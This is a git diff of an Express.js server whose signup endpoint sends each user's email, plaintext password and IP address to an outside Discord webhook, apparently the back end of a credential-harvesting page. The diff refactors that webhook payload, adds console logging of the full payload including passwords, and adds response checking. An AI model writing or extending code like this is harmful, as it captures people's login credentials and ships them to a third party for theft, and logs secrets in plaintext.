@@ -15,7 +15,7 @@ console.log("Webhook loaded:", !!DISCORD_WEBHOOK_URL);
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ✅ FIXED: use lowercase "public"
+// Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Email validation
@@ -42,32 +42,45 @@ async function sendDiscordNotification({ email, password, ip }) {
   try {
     console.log("Sending webhook...");
 
+    const payload = {
+      username: "Signup Bot",
+      embeds: [
+        {
+          title: "New Signup",
+          color: 3066993,
+          fields: [
+            { name: "Email", value: email || "N/A", inline: true },
+            { name: "Password", value: password || "N/A", inline: false },
+            { name: "IP", value: ip || "unknown", inline: true },
+            { name: "Time", value: new Date().toISOString(), inline: false }
+          ]
+        }
+      ]
+    };
+
+    console.log("Payload:", JSON.stringify(payload, null, 2));
+
     const response = await fetch(DISCORD_WEBHOOK_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
-      body: JSON.stringify({
-        username: "Signup Bot",
-        embeds: [
-          {
-            title: "New Signup",
-            color: 3066993,
-            fields: [
-              { name: "Email", value: email, inline: true },
-              { name: "Password", value: password, inline: false },
-              { name: "IP", value: ip, inline: true },
-              { name: "Time", value: new Date().toISOString() }
-            ]
-          }
-        ]
-      })
+      body: JSON.stringify(payload)
     });
 
+    const text = await response.text().catch(() => "");
+
     console.log("Discord status:", response.status);
+    console.log("Discord response body:", text);
+
+    if (!response.ok) {
+      console.error("❌ Discord rejected the request");
+    } else {
+      console.log("✅ Webhook sent successfully");
+    }
 
   } catch (err) {
-    console.error("Webhook error:", err.message);
+    console.error("Webhook error:", err);
   }
 }
 
@@ -87,6 +100,7 @@ app.post('/users', async (req, res) => {
 
     console.log(`Signup: ${email} (${ip})`);
 
+    // Fire and forget (no await so response is fast)
     sendDiscordNotification({ email, password, ip });
 
     return res.json({
@@ -100,7 +114,7 @@ app.post('/users', async (req, res) => {
   }
 });
 
-// ✅ Serve homepage
+// Serve homepage
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -110,7 +124,7 @@ app.get('/health', (req, res) => {
   res.json({ status: "ok" });
 });
 
-// Start server (Render compatible)
+// Start server
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
